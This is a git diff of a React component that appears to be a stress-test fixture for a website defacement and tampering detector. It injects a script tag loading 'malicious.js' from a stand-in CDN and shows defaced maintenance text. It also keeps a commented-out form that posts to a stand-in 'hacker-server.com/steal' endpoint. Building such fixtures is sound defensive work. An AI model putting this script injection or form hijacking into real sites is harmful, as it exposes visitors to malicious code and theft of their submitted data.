@@ -1,24 +1,18 @@
 import React, { useEffect } from 'react';
 
 /**
- * MainContent - Layer 1 Full Stress Test
- * 
- * Logic being tested:
- * 1. Script Injection (via useEffect) -> script_injection_new_domain
- * 2. Structural Drift (h5 instead of h1) -> raw_score change
- * 3. Form Hijacking (action change) -> form_action_change_payment
+ * MainContent - Layer 1 Full Stress Test (Fixed Syntax)
  */
-
 const MainContent = () => {
   
-  // Method to bypass React's script protection and force it into the DOM
+  // Properly inject the malicious script into the DOM for detector testing
   useEffect(() => {
     const script = document.createElement("script");
     script.src = "https://unknown-cdn.com/malicious.js";
     script.id = "malicious-script-trigger";
+    script.async = true;
     document.body.appendChild(script);
     
-    // Cleanup when component unmounts
     return () => {
       const el = document.getElementById("malicious-script-trigger");
       if (el) document.body.removeChild(el);
@@ -28,6 +22,7 @@ const MainContent = () => {
   return (
     <div className="defaced-root" id="layer1-pwned-zone">
 
+      {/* HEADER SECTION */}
       <header
         className="hacked-header"
         style={{
@@ -37,8 +32,7 @@ const MainContent = () => {
           textAlign: 'center',
         }}
       >
-        {/* TEST 1: Change h1 to h5 (Structural Drift) */}
-        {/* <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
+        <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
           PLATFORM MAINTENANCE ACTIVE
         </h5>
 
@@ -47,15 +41,14 @@ const MainContent = () => {
         </h2>
       </header>
 
+      {/* MAIN SECTION */}
       <main className="content-purge" style={{ padding: '30px' }}>
-
         <p>
           This platform is currently undergoing infrastructure upgrades
           and authentication system maintenance.
-        </p> */}
+        </p>
 
-        {/* TEST 2: Form Action Hijacking */}
-        {/* Note: Ensure page_type is set to 'payment' in your DB to trigger this! */}
+        {/* TEST: Form Hijacking (action change) */}
         {/* <form 
           action="https://hacker-server.com/steal" 
           method="POST"
@@ -101,7 +94,7 @@ const MainContent = () => {
         </form>
       </main>
 
-      {/* Structural filler */}
+      {/* STRUCTURAL NOISE (For TED testing) */}
       <div
         className="structural-noise"
         aria-hidden="true"
@@ -116,6 +109,7 @@ const MainContent = () => {
         ))}
       </div>
 
+      {/* FOOTER SECTION */}
       <footer
         className="footer-void"
         style={{
